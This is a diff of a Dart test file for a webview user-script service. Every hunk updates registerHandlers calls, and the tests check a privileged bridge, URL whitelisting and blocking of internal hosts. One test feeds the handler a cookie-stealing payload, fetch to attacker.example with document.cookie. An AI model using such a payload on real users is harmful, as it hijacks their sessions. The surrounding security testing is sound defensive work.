@@ -38,7 +38,7 @@ void main() {
       final ctrl = FakeUserScriptController();
       final svc = serviceWith(plainScript);
 
-      svc.registerHandlers(ctrl);
+      svc.registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       expect(svc.hasScripts, isTrue, reason: 'the script still runs');
       expect(svc.hasPrivilegedBridge, isFalse);
@@ -61,7 +61,7 @@ void main() {
         ),
       ]);
 
-      svc.registerHandlers(ctrl);
+      svc.registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       expect(svc.hasPrivilegedBridge, isTrue);
       expect(ctrl.handlers, isNotEmpty);
@@ -78,7 +78,7 @@ void main() {
         ),
       ]);
 
-      svc.registerHandlers(ctrl);
+      svc.registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       expect(svc.hasPrivilegedBridge, isFalse);
       expect(ctrl.handlers, isEmpty);
@@ -104,7 +104,7 @@ void main() {
             asked.add(url);
             return false;
           },
-        ).registerHandlers(ctrl);
+        ).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
         final res = await ctrl.handler(kFetchHandlerPrefix)([
           'https://not-whitelisted.example/x',
@@ -128,7 +128,7 @@ void main() {
           asked.add(url);
           return false;
         },
-      ).registerHandlers(ctrl);
+      ).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       final ok = await ctrl.handler(kScriptHandlerPrefix)([
         'https://not-whitelisted.example/x',
@@ -158,7 +158,7 @@ void main() {
         final factory = FakeOutbound(responder: (_) => http.Response('x', 200));
         outboundHttp = factory;
         final ctrl = FakeUserScriptController();
-        serviceWith(oneScript).registerHandlers(ctrl);
+        serviceWith(oneScript).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
         final res = await ctrl.handler(kFetchHandlerPrefix)([url]);
 
@@ -177,7 +177,7 @@ void main() {
       final factory = FakeOutbound(responder: (_) => http.Response('x', 200));
       outboundHttp = factory;
       final ctrl = FakeUserScriptController();
-      serviceWith(oneScript).registerHandlers(ctrl);
+      serviceWith(oneScript).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       expect(
         classifyScriptFetchUrl('http://localtest.me/admin'),
@@ -198,7 +198,7 @@ void main() {
       final factory = FakeOutbound(responder: (_) => http.Response('x', 200));
       outboundHttp = factory;
       final ctrl = FakeUserScriptController();
-      serviceWith(oneScript).registerHandlers(ctrl);
+      serviceWith(oneScript).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       final res = await ctrl.handler(kFetchHandlerPrefix)([
         'http://nas.example/config',
@@ -219,7 +219,7 @@ void main() {
       final factory = FakeOutbound(responder: (_) => http.Response('x', 200));
       outboundHttp = factory;
       final ctrl = FakeUserScriptController();
-      serviceWith(oneScript).registerHandlers(ctrl);
+      serviceWith(oneScript).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       final res = await ctrl.handler(kFetchHandlerPrefix)([
         'http://mixed.example/x',
@@ -240,7 +240,7 @@ void main() {
       );
       outboundHttp = factory;
       final ctrl = FakeUserScriptController();
-      serviceWith(oneScript).registerHandlers(ctrl);
+      serviceWith(oneScript).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       final res = await ctrl.handler(kFetchHandlerPrefix)([
         'http://cdn.example/lib.js',
@@ -264,7 +264,7 @@ void main() {
       serviceWith(oneScript, confirm: (_) async {
         prompted = true;
         return true;
-      }).registerHandlers(ctrl);
+      }).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       final ok = await ctrl.handler(kScriptHandlerPrefix)([
         'http://cdn.evil.example/lib.js',
@@ -292,7 +292,7 @@ void main() {
           type: ProxyType.SOCKS5,
           address: '127.0.0.1:9050',
         ),
-      ).registerHandlers(ctrl);
+      ).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       final res = await ctrl.handler(kFetchHandlerPrefix)([
         'http://onion-gw.example/x',
@@ -310,7 +310,7 @@ void main() {
     test('evaluates whatever source the caller supplies', () async {
       outboundHttp = FakeOutbound(responder: (_) => http.Response('x', 200));
       final ctrl = FakeUserScriptController();
-      serviceWith(oneScript).registerHandlers(ctrl);
+      serviceWith(oneScript).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       await ctrl.handler(kInlineHandlerPrefix)([
         'fetch("https://attacker.example/?c="+document.cookie)',
@@ -323,7 +323,7 @@ void main() {
       'handlers are absent entirely when the site has no user scripts',
       () async {
         final ctrl = FakeUserScriptController();
-        serviceWith([]).registerHandlers(ctrl);
+        serviceWith([]).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
         expect(ctrl.handlers, isEmpty);
       },
@@ -338,7 +338,7 @@ void main() {
           enabled: false,
           bypassSitePolicy: true,
         ),
-      ]).registerHandlers(ctrl);
+      ]).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
 
       expect(ctrl.handlers, isEmpty);
     });
@@ -354,7 +354,7 @@ void main() {
     test('names are time-derived, not random', () async {
       final before = DateTime.now().microsecondsSinceEpoch;
       final ctrl = FakeUserScriptController();
-      serviceWith(oneScript).registerHandlers(ctrl);
+      serviceWith(oneScript).registerHandlers(ctrl.addJavaScriptHandler, page: ctrl.page);
       final after = DateTime.now().microsecondsSinceEpoch;
 
       for (final prefix in [
